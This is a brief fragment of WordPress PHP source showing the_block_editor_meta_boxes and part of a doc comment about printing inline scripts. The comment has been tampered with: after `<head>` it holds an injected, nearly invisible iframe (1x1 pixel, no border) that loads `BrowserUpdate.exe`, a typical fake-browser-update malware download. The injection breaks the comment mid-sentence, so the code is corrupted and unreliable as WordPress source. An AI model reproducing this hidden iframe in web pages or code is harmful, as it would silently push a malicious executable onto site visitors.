...
function the_block_editor_meta_boxes() {
	...
	/**
	 * When `wp-edit-post` is output in the `<head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>`, the inline script needs to be manually printed. Otherwise,
